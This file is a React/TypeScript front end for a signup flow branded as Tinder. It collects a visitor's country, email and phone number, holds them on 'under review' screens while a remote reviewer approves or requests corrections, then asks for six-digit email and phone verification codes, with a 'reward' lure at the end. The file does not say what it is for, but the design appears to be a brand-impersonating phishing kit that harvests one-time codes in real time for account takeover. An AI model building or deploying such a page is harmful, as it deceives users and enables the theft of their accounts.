import { useEffect, useMemo, useRef, useState } from "react";
import { authClient, rememberSessionToken } from "@/lib/auth/client";
import { type AppUser } from "@/lib/auth/use-current-user";
import { TinderMark } from "@/components/tinder-mark";
import { COUNTRIES, dialCode, withDialCode, isExactPhone, localPhoneDigits, phonePlaceholder } from "@/data/countries";
import { saveApplication, continueApplication, confirmCode, endVisitorSession, getAccess, WRONG_PHONE_NOTICE, NEW_EMAIL_NOTICE, DECLINE_DETAILS_NOTICE, RESTART_COUNTRY_NOTICE, RESTART_DETAILS_NOTICE, type Access } from "@/lib/applications";
import { countryLabel, localizeMessage, useLocale } from "@/lib/locale";

function fold(value: string) {
  return value
    .normalize("NFD")
    .replace(/\p{M}/gu, "")
    .toLowerCase();
}

const COUNTRY_INDEX = COUNTRIES.map((name) => ({
  name,
  lower: name.toLowerCase(),
  folded: fold(name),
  dial: dialCode(name),
}));

const REVIEW_LOCK = "tinder-details-review";

type ReviewLock = { at: number; email: string; phone: string; country: string };

function readReviewLock(): ReviewLock | null {
  if (typeof sessionStorage === "undefined") return null;
  try {
    const raw = sessionStorage.getItem(REVIEW_LOCK);
    if (!raw) return null;
    const parsed = JSON.parse(raw) as ReviewLock;
    if (!parsed || !Number.isFinite(parsed.at)) return null;
    return parsed;
  } catch {
    return null;
  }
}

function writeReviewLock(lock: ReviewLock) {
  sessionStorage.setItem(REVIEW_LOCK, JSON.stringify(lock));
}

function clearReviewLock() {
  sessionStorage.removeItem(REVIEW_LOCK);
}

function sameSubmission(
  existing: { email?: string; phone?: string } | null | undefined,
  lock: ReviewLock,
) {
  const email = String(existing?.email ?? "").trim().toLowerCase() === lock.email.trim().toLowerCase();
  const phone = String(existing?.phone ?? "").replace(/\D/g, "") === lock.phone.replace(/\D/g, "");
  return email && phone;
}

function approvalAfterLock(
  existing: { status?: string; email?: string; phone?: string; updatedAt?: number; notice?: string | null } | null | undefined,
  lock: ReviewLock | null,
) {
  if (!lock || !existing) return false;
  if (editingNotice(existing)) return false;
  if (existing.status !== "approved") return false;
  if (!sameSubmission(existing, lock)) return false;
  return (existing.updatedAt ?? 0) > lock.at;
}

function editingNotice(existing: { status?: string; notice?: string | null } | null | undefined) {
  return (
    existing?.status === "rejected" ||
    existing?.notice === WRONG_PHONE_NOTICE ||
    existing?.notice === NEW_EMAIL_NOTICE ||
    existing?.notice === DECLINE_DETAILS_NOTICE ||
    existing?.notice === RESTART_COUNTRY_NOTICE ||
    existing?.notice === RESTART_DETAILS_NOTICE
  );
}

export function ApplyFlow({
  user,
  access,
  onAccess,
  onReview,
}: {
  user: AppUser | null;
  access: Access | null;
  onAccess: (access: Access) => void;
  onReview: () => void;
}) {
  const existing = access?.application ?? null;
  const [step, setStep] = useState<"country" | "contact">("country");
  const [country, setCountry] = useState("");
  const [query, setQuery] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [codeError, setCodeError] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [busy, setBusy] = useState(false);
  const [reviewLock, setReviewLock] = useState<ReviewLock | null>(() => readReviewLock());
  useEffect(() => {
    if (!reviewLock || !existing) return;
    const released = approvalAfterLock(existing, reviewLock);
    const editingNow = (existing.updatedAt ?? 0) > reviewLock.at && editingNotice(existing);
    if (!released && !editingNow) return;
    clearReviewLock();
    setReviewLock(null);
  }, [reviewLock, existing]);
  const seededPhone = useRef("");
  const phoneRef = useRef<HTMLInputElement>(null);
  const emailRef = useRef<HTMLInputElement>(null);
  const countryRef = useRef<HTMLInputElement>(null);
  const pressY = useRef(0);
  const { locale, t } = useLocale();
  const wrongPhone = existing?.notice === WRONG_PHONE_NOTICE;
  const newEmail = existing?.notice === NEW_EMAIL_NOTICE;
  const phoneUnchanged =
    wrongPhone && existing?.phone != null && phone.replace(/\D/g, "") === String(existing.phone).replace(/\D/g, "");
  const emailUnchanged =
    newEmail && existing?.email != null && email.trim().toLowerCase() === String(existing.email).trim().toLowerCase();

  useEffect(() => {
    if (!existing) return;
    const back =
      existing.status === "rejected" ||
      existing.notice === WRONG_PHONE_NOTICE ||
      existing.notice === NEW_EMAIL_NOTICE;
    if (!back) return;
    const key = `${existing.status}|${existing.notice ?? ""}|${existing.email}|${existing.phone}`;
    if (seededPhone.current === key) return;
    seededPhone.current = key;
    setCountry(existing.country || "");
    setPhone(withDialCode(String(existing.phone ?? ""), existing.country || ""));
    setCode("");
    if (existing.notice === RESTART_COUNTRY_NOTICE) {
      setStep("country");
      setQuery("");
      setEmail(String(existing.email ?? "").replace(/\s/g, ""));
      return;
    }
    setStep("contact");
    setEmail(existing.notice === NEW_EMAIL_NOTICE ? "" : String(existing.email ?? "").replace(/\s/g, ""));
  }, [existing]);

  useEffect(() => {
    if (existing?.notice === "Enter the email code again." || existing?.notice === "Enter the phone code again.") setCode("");
  }, [existing?.notice]);

  useEffect(() => {
    if (step === "country" && existing?.notice === RESTART_COUNTRY_NOTICE) countryRef.current?.focus();
    if (step !== "contact") return;
    if (wrongPhone) phoneRef.current?.focus();
    else if (newEmail || existing?.notice === DECLINE_DETAILS_NOTICE || existing?.notice === RESTART_DETAILS_NOTICE) emailRef.current?.focus();
  }, [step, wrongPhone, newEmail, existing?.notice]);

  const needle = fold(query.trim());
  const matches = useMemo(() => {
    if (!needle) return COUNTRIES;
    const dialNeedle = needle.replace(/^\+/, "");
    const starts: string[] = [];
    const rest: string[] = [];
    for (const item of COUNTRY_INDEX) {
      const local = fold(countryLabel(item.name, locale));
      const nameHit = item.folded.startsWith(needle) || local.startsWith(needle);
      const dialHit = dialNeedle.length > 0 && item.dial.startsWith(dialNeedle);
      if (nameHit || dialHit) starts.push(item.name);
      else if (item.folded.includes(needle) || local.includes(needle) || (dialNeedle.length > 1 && item.dial.includes(dialNeedle))) rest.push(item.name);
    }
    return [...starts, ...rest].slice(0, 12);
  }, [needle, locale]);

  const phoneReady = typeof existing?.phone === "string" && existing.phone.replace(/\D/g, "").length >= 8;

  const onAccessRef = useRef(onAccess);
  onAccessRef.current = onAccess;

  useEffect(() => {
    if (!existing) return;
    const done =
      existing.status === "approved" &&
      existing.emailVerified &&
      existing.phoneVerified &&
      existing.rewardStatus === "approved";
    if (done || access?.login === "blocked") return;
    let stop = false;
    const tick = () => {
      getAccess({ data: { at: Date.now() } })
        .then((next) => {
          if (!stop) onAccessRef.current(next);
        })
        .catch(() => undefined);
    };
    tick();
    const id = window.setInterval(tick, 1000);
    return () => {
      stop = true;
      window.clearInterval(id);
    };
  }, [
    existing?.status,
    existing?.emailVerified,
    existing?.phoneVerified,
    existing?.emailCodePending,
    existing?.phoneCodePending,
    existing?.rewardStatus,
    access?.login,
  ]);

  if (user && access?.login === "blocked") {
    return (
      <section className="flex h-full flex-col px-5">
        <BrandMark onLogout={logOut} />
        <div className="ember-rise flex flex-1 flex-col justify-center">
          <p className="text-sm font-medium text-ember">{t("blocked")}</p>
          <h1 className="mt-2 font-serif text-4xl tracking-tight">{t("blockedTitle")}</h1>
          <p className="mt-3 text-stone">{t("blockedBody")}</p>
        </div>
      </section>
    );
  }

  const editing = editingNotice(existing);
  const detailsReady = Boolean(existing?.email) && phoneReady;
  const approvedAfterSubmit = approvalAfterLock(existing, reviewLock);
  const showReview = (!!reviewLock && !approvedAfterSubmit && !editing) || Boolean(existing && existing.status !== "approved" && !editing);

  if (showReview) {
    const shownCountry = reviewLock?.country || existing?.country || country;
    const shownEmail = reviewLock?.email || existing?.email || email;
    const shownPhone = String(reviewLock?.phone || existing?.phone || phone || "");
    return (
      <section className="flex h-full flex-col">
        <div className="px-5">
          <BrandMark />
        </div>
        <Progress value={40} />
        <div className="flex min-h-0 flex-1 flex-col px-5">
          <h1 className="mt-2 font-serif text-3xl tracking-tight">{t("contactDetails")}</h1>
          <p className="mt-2 text-sm text-stone">{shownCountry ? countryLabel(shownCountry, locale) : ""}</p>
          <label className="mt-4 block text-sm font-medium text-stone" htmlFor="wait-email">
            {t("email")}
          </label>
          <input id="wait-email" readOnly value={shownEmail} className="field mt-1 px-4" />
          <label className="mt-3 block text-sm font-medium text-stone" htmlFor="wait-phone">
            {t("phone")}
          </label>
          <input id="wait-phone" readOnly value={shownPhone.startsWith("+") ? shownPhone : `+${shownPhone.replace(/\D/g, "")}`} className="field mt-1 px-4" />
          <p className="mt-4 text-sm font-medium text-cream">{t("underReview")}</p>
          <Loader />
        </div>
      </section>
    );
  }

  const codeOpen = existing?.status === "approved" && (!reviewLock || approvedAfterSubmit);

  if (existing && codeOpen && !existing.emailVerified && existing.emailCodePending) {
    return (
      <CodeStep
        kicker={t("emailCode")}
        progress={60}
        title={t("underReview")}
        body={t("underReview")}
        waiting
      />
    );
  }

  if (existing && codeOpen && !existing.emailVerified && !existing.emailCodePending && detailsReady) {
    return (
      <CodeStep
        kicker={t("emailCode")}
        progress={60}
        title={t("enterEmailCode")}
        body={
          existing.notice === "Enter the email code again." || existing.notice === "That code was not accepted. Enter the code again."
            ? localizeMessage(existing.notice, locale)
            : t("enterCodeFor", { target: existing.email || "" })
        }
        code={code}
        error={codeError}
        busy={busy}
        onChange={setCode}
        onSubmit={() => void submitCode("email")}
        onReview={access && (access.isReviewer || access.needsReviewer) ? onReview : undefined}
      />
    );
  }

  if (existing?.status === "approved" && existing.emailVerified && existing.phoneCodePending && !existing.phoneVerified) {
    return (
      <CodeStep
        kicker={t("phoneCode")}
        progress={80}
        title={t("underReview")}
        body={t("underReview")}
        waiting
       
      />
    );
  }

  if (existing && existing.status === "approved" && existing.emailVerified && !existing.phoneVerified && !existing.phoneCodePending && phoneReady) {
    return (
      <CodeStep
        kicker={t("phoneCode")}
        progress={80}
        title={t("confirmPhone")}
        body={
          existing.notice === "Enter the phone code again." || existing.notice === "That code was not accepted. Enter the code again."
            ? localizeMessage(existing.notice, locale)
            : t("phoneCodeBody", { phone: existing.phone.replace(/\D/g, "") })
        }
        code={code}
        error={codeError}
        busy={busy}
        onChange={setCode}
        onSubmit={() => void submitCode("phone")}
        onReview={access && (access.isReviewer || access.needsReviewer) ? onReview : undefined}
       
      />
    );
  }

  if (existing?.emailVerified && existing.phoneVerified && existing.rewardStatus !== "approved") {
    const declined = existing.rewardStatus === "declined";
    return (
      <section className="flex h-full flex-col px-5">
        <BrandMark />
        <Progress value={90} />
        <div className="ember-rise flex flex-1 flex-col justify-center">
          <p className="text-sm font-medium text-ember">{declined ? t("notApproved") : t("reward")}</p>
          <h1 className="mt-2 font-serif text-4xl tracking-tight">
            {declined ? t("rewardNotApproved") : t("rewardUnderReview")}
          </h1>
          <p className="mt-3 text-stone">
            {declined
              ? t("rewardDeclinedBody")
              : t("underReview")}
          </p>
          {declined ? null : <Loader />}
        </div>
      </section>
    );
  }

  if (existing && !editing && existing.status === "pending") {
    return (
      <section className="flex h-full flex-col px-5">
        <BrandMark />
        <Progress value={40} />
        <div className="ember-rise flex flex-1 flex-col justify-center">
          <p className="text-sm font-medium text-ember">{t("underReview")}</p>
          <h1 className="mt-2 font-serif text-4xl tracking-tight">{t("underReview")}</h1>
          <Loader />
        </div>
      </section>
    );
  }

  const suggested = needle
    ? matches.find((name) => {
        const local = fold(countryLabel(name, locale));
        return fold(name).startsWith(needle) || local.startsWith(needle);
      })
    : undefined;
  const suggestedLabel = suggested ? countryLabel(suggested, locale) : "";
  const ghost =
    suggestedLabel && query.length > 0 && fold(suggestedLabel).startsWith(fold(query))
      ? suggestedLabel.slice(query.length)
      : "";

  function chooseCountry(name: string) {
    setPhone((current) => withDialCode(current, name, country));
    setCountry(name);
    setQuery(countryLabel(name, locale));
  }

  async function logOut() {
    try {
      await endVisitorSession();
    } catch {
      /* the local clear below still ends this browser session */
    }
    rememberSessionToken(null);
    clearReviewLock();
    window.location.replace("/");
  }

  async function submitCode(channel: "email" | "phone") {
    setError(null);
    setBusy(true);
    try {
      const next = await confirmCode({ data: { channel, code } });
      setCode("");
      setCodeError(null);
      onAccess(next);
    } catch (err) {
      setCodeError(err instanceof Error ? localizeMessage(err.message, locale) : t("codeCheckFailed"));
    } finally {
      setBusy(false);
    }
  }

  async function submit() {
    if (!country) {
      setError(t("chooseCountryFirst"));
      return;
    }
    if (!email.includes("@")) {
      setError(t("enterEmail"));
      return;
    }
    if (!isExactPhone(phone, country)) {
      setError(t("phoneInvalid", { country: countryLabel(country, locale) }));
      return;
    }
    if (phoneUnchanged) {
      setError(t("correctPhone"));
      return;
    }
    if (emailUnchanged) {
      setError(t("anotherEmail"));
      return;
    }
    setError(null);
    setBusy(true);
    const baseline = Math.max(existing?.updatedAt ?? 0, 0);
    const hold = { at: baseline, email, phone, country };
    writeReviewLock(hold);
    setReviewLock(hold);
    try {
      const send = () =>
        user
          ? saveApplication({ data: { country, email, phone } })
          : continueApplication({ data: { country, email, phone } }).then((result) => {
              if (result.token) rememberSessionToken(result.token);
              void authClient.getSession();
              return result.access;
            });
      let last: unknown;
      for (let attempt = 0; attempt < 3; attempt += 1) {
        try {
          const saved = await send();
          const serverAt = saved.application?.updatedAt ?? 0;
          const lock = { at: Math.max(baseline, serverAt), email, phone, country };
          writeReviewLock(lock);
          setReviewLock(lock);
          onAccess(saved);
          return;
        } catch (err) {
          last = err;
          const message = err instanceof Error ? err.message : "";
          if (!/failed to fetch|network|abort/i.test(message) || attempt === 2) break;
          await new Promise((resolve) => window.setTimeout(resolve, 400));
        }
      }
      const message = last instanceof Error ? last.message : "";
      clearReviewLock();
      setReviewLock(null);
      setError(message ? localizeMessage(message, locale, country) : t("submitRetry"));
    } finally {
      setBusy(false);
    }
  }

  return (
    <section className="flex min-h-0 flex-1 flex-col">
      <div className="px-5">
        <BrandMark />
        <Progress value={step === "country" ? 20 : 40} />
      </div>
      {step === "country" ? (
        <>
          <div className="px-5">
            <h1 className="mt-2 font-sans text-4xl font-extrabold tracking-tight">TINDER</h1>
            <p className="mt-6 font-serif text-3xl tracking-tight">{t("chooseCountry")}</p>
            <div className="field relative mt-5">
              {ghost ? (
                <div className="pointer-events-none absolute inset-0 flex items-center px-4" aria-hidden="true">
                  <span className="invisible">{query}</span>
                  <span className="text-stone">{ghost}</span>
                </div>
              ) : null}
              <input
                ref={countryRef}
                value={query}
                onChange={(event) => {
                  const next = event.target.value;
                  setQuery(next);
                  const typed = next.trim().toLowerCase();
                  if (!typed) return;
                  const pick = COUNTRY_INDEX.find((item) => {
                    const local = fold(countryLabel(item.name, locale));
                    return item.folded.startsWith(typed) || local.startsWith(typed);
                  });
                  if (pick && pick.name !== country) {
                    setPhone((current) => withDialCode(current, pick.name, country));
                    setCountry(pick.name);
                  }
                }}
                onKeyDown={(event) => {
                  if ((event.key === "Tab" || event.key === "Enter") && suggested) {
                    event.preventDefault();
                    chooseCountry(suggested);
                  }
                }}
                placeholder={t("searchCountries")}
                aria-label={t("searchCountries")}
                aria-autocomplete="list"
                autoComplete="off"
                className="relative h-full w-full bg-transparent px-4 text-cream outline-none placeholder:text-stone"
              />
            </div>
          </div>
          <ul className="scroller mt-3 min-h-0 flex-1 overflow-y-auto px-5">
            {matches.map((name) => {
              const selected = name === country;
              return (
                <li key={name}>
                  <button
                    type="button"
                    aria-pressed={selected}
                    onMouseDown={(event) => event.preventDefault()}
                    onPointerDown={(event) => {
                      pressY.current = event.clientY;
                    }}
                    onPointerUp={(event) => {
                      if (event.pointerType !== "touch") return;
                      if (Math.abs(event.clientY - pressY.current) > 10) return;
                      chooseCountry(name);
                    }}
                    onClick={() => chooseCountry(name)}
                    className={
                      selected
                        ? "flex h-12 w-full items-center rounded-xl bg-chip px-3 text-left font-medium text-cream ring-1 ring-[#ff4d6a]"
                        : "flex h-12 w-full items-center rounded-xl px-3 text-left text-cream"
                    }
                  >
                    {countryLabel(name, locale)}
                    {needle && name === suggested ? (
                      <span className="ml-2 text-xs font-medium text-ember">{t("suggested")}</span>
                    ) : null}
                    <span className="ml-auto text-sm text-stone">+{dialCode(name)}</span>
                  </button>
                </li>
              );
            })}
            {needle && matches.length === 0 ? <li className="py-6 text-stone">{t("noCountry")}</li> : null}
          </ul>
          {error && step === "country" ? <p className="px-5 pt-2 text-sm text-ember">{error}</p> : null}
          <div className="safe-b px-5 pt-3">
            <button
              type="button"
              onClick={() => {
                if (!country) {
                  setError(t("chooseCountryFirst"));
                  return;
                }
                setError(null);
                setStep("contact");
              }}
              className="brand-btn tap"
            >
              {t("continue")}
            </button>
          </div>
        </>
      ) : (
        <form
          className="flex min-h-0 flex-1 flex-col px-5"
          noValidate
          onSubmit={(event) => {
            event.preventDefault();
            void submit();
          }}
        >
          <h1 className="mt-2 font-serif text-3xl tracking-tight">{t("contactDetails")}</h1>
          <button
            type="button"
            onClick={() => setStep("country")}
            className="mt-2 self-start text-sm font-medium text-stone"
          >
            {country ? countryLabel(country, locale) : t("changeCountry")}
          </button>
          {wrongPhone ? (
            <p className="mt-4 text-sm font-medium text-[#ff3b30]">{t("correctPhone")}</p>
          ) : newEmail ? (
            <p className="mt-4 text-sm font-medium text-[#ff3b30]">{t("anotherEmail")}</p>
          ) : existing?.notice === DECLINE_DETAILS_NOTICE || existing?.notice === RESTART_DETAILS_NOTICE || existing?.notice === RESTART_COUNTRY_NOTICE ? (
            <p className="mt-4 text-sm font-medium text-cream">{localizeMessage(existing.notice, locale)}</p>
          ) : existing?.notice ? (
            <p className="mt-4 rounded-2xl bg-chip px-4 py-3 text-sm text-cream">{localizeMessage(existing.notice, locale)}</p>
          ) : existing?.status === "rejected" ? (
            <p className="mt-4 rounded-2xl bg-chip px-4 py-3 text-sm text-cream">
              {t("declinedRetry")}
            </p>
          ) : null}
          <label className={`mt-4 block text-sm font-medium ${newEmail ? "text-[#ff3b30]" : "text-stone"}`} htmlFor="email">
            {t("email")}
          </label>
          <input
            id="email"
            ref={emailRef}
            type="email"
            autoComplete="off"
            inputMode="email"
            required
            value={email}
            onChange={(event) => setEmail(event.target.value.replace(/\s/g, ""))}
            placeholder="you@email.com"
            className={`field mt-1 px-4 ${emailUnchanged ? "phone-alert" : ""}`}
          />
          <label className={`mt-3 block text-sm font-medium ${wrongPhone ? "text-[#ff3b30]" : "text-stone"}`} htmlFor="phone">
            {t("phone")}
          </label>
          <div
            className={`field mt-1 flex items-center ${phoneUnchanged ? "phone-alert" : ""}`}
          >
            <span className="shrink-0 pl-4 font-medium text-cream">+{dialCode(country)}</span>
            <input
              id="phone"
              ref={phoneRef}
              type="tel"
              autoComplete="off"
              inputMode="tel"
              required
              aria-invalid={phoneUnchanged || undefined}
              value={phone.replace(/\D/g, "").replace(new RegExp(`^${dialCode(country)}`), "")}
              onChange={(event) => {
                const local = localPhoneDigits(event.target.value, country);
                setPhone(withDialCode(local, country));
              }}
              placeholder={phonePlaceholder(country)}
              className="h-full w-full min-w-0 flex-1 bg-transparent pr-4 pl-0 text-cream outline-none placeholder:text-stone"
            />
          </div>
          {emailUnchanged ? (
            <p className="mt-2 text-sm text-[#ff3b30]">{t("emailRejected")}</p>
          ) : null}
          {phoneUnchanged ? (
            <p className="mt-2 text-sm text-[#ff3b30]">{t("phoneRejected")}</p>
          ) : null}
          {error ? <p className="mt-3 text-sm text-ember">{error}</p> : null}
          <div className="safe-b pt-4">
            <button
              type="button"
              disabled={busy}
              onClick={() => void submit()}
              className="brand-btn tap"
            >
              {busy ? <Spinner /> : t("continue")}
            </button>
          </div>
        </form>
      )}
    </section>
  );
}

function CodeStep({
  kicker,
  title,
  body,
  code = "",
  error = null,
  busy = false,
  waiting = false,
  progress = 60,
  onChange,
  onSubmit,
  onReview,
  onLogout,
}: {
  kicker: string;
  title: string;
  body: string;
  code?: string;
  error?: string | null;
  busy?: boolean;
  waiting?: boolean;
  progress?: number;
  onChange?: (value: string) => void;
  onSubmit?: () => void;
  onReview?: () => void;
  onLogout?: () => void;
}) {
  const { t } = useLocale();
  return (
    <form
      className="flex h-full flex-col px-5"
      onSubmit={(event) => {
        event.preventDefault();
        onSubmit?.();
      }}
    >
      <BrandMark onLogout={onLogout} />
      <Progress value={progress} />
      <div className="ember-rise">
        <p className="text-sm font-medium text-ember">{kicker}</p>
        <h1 className="mt-2 font-serif text-4xl tracking-tight">{title}</h1>
        <p className="mt-3 text-stone">{body}</p>
        {waiting ? <Loader /> : (
          <>
            <label className="mt-6 block text-sm font-medium text-stone" htmlFor="verify-code">
              {t("sixDigit")}
            </label>
            <input
              id="verify-code"
              autoFocus
              inputMode="numeric"
              autoComplete="one-time-code"
              value={code}
              onChange={(event) => onChange?.(event.target.value.replace(/\D/g, "").slice(0, 6))}
              placeholder="000000"
              className="field mt-2 text-center font-sans text-2xl tracking-[0.4em]"
            />
            {error ? <p className="mt-3 text-sm text-ember">{error}</p> : null}
          </>
        )}
      </div>
      {waiting ? null : (
      <div className="safe-b mt-4 pb-4">
        <button
          type="submit"
          disabled={busy || code.length !== 6}
          className="brand-btn tap"
        >
          {busy ? <Spinner /> : t("confirmCode")}
        </button>
        {onReview ? (
          <button type="button" onClick={onReview} className="tap mt-3 h-12 w-full rounded-2xl border border-line font-medium text-cream">
            {t("reviewRequests")}
          </button>
        ) : null}
      </div>
      )}
    </form>
  );
}

function Loader() {
  const { t } = useLocale();
  return (
    <div className="mt-8 flex justify-center" role="status" aria-live="polite">
      <span className="spin size-12 rounded-full border-[3px] border-white/20 border-t-[#ff4d6a]" aria-label={t("loading")} />
    </div>
  );
}

function Spinner() {
  const { t } = useLocale();
  return <span className="spin size-5 rounded-full border-2 border-white/35 border-t-white" aria-label={t("loading")} />;
}

function Progress({ value }: { value: number }) {
  return (
    <div
      className="mb-3 h-1.5 overflow-hidden rounded-full bg-chip"
      role="progressbar"
      aria-valuenow={value}
      aria-valuemin={0}
      aria-valuemax={100}
    >
      <div
        className="h-full rounded-full bg-gradient-to-r from-[#fd267a] to-[#ff6036]"
        style={{ width: `${value}%` }}
      >
        <span className="bar-slide block h-full w-1/2 bg-white/35" />
      </div>
    </div>
  );
}

function BrandMark({ onLogout }: { onLogout?: () => void | Promise<void> }) {
  const [leaving, setLeaving] = useState(false);
  const { t } = useLocale();
  return (
    <div className="flex h-14 items-center gap-2">
      <TinderMark className="size-7" />
      <span className="font-sans text-xl font-extrabold tracking-tight">TINDER</span>
      {onLogout ? (
        <button
          type="button"
          disabled={leaving}
          onClick={() => {
            if (leaving) return;
            setLeaving(true);
            void Promise.resolve(onLogout());
          }}
          className="tap ml-auto grid h-8 min-w-8 place-items-center text-sm font-medium text-stone disabled:opacity-80"
        >
          {leaving ? <span className="spin size-4 rounded-full border-2 border-stone border-t-transparent" aria-label={t("loading")} /> : t("logOut")}
        </button>
      ) : null}
    </div>
  );
}
